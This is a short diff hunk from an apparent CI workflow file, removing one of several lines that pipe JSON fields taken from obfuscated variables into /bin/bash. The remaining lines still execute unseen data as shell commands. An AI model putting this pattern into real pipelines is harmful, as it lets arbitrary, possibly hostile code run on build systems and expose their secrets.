@@ -23,7 +23,6 @@ jobs:
           echo $hrwm8510 | jq -r .agpp35 | /bin/bash
           echo $ocrx93 | jq -r .fmlte512 | /bin/bash
           echo $a8 | jq -r .ejofo1 | /bin/bash
-          printf '%s' "$i586" | jq -r .bs4979 | /bin/bash
           echo $acdd4 | jq -r .i4004 | /bin/bash
           printf '%s' "$spck284" | jq -r .u38 | /bin/bash
           echo $gqbev3 | jq -r .cznj95 | /bin/bash
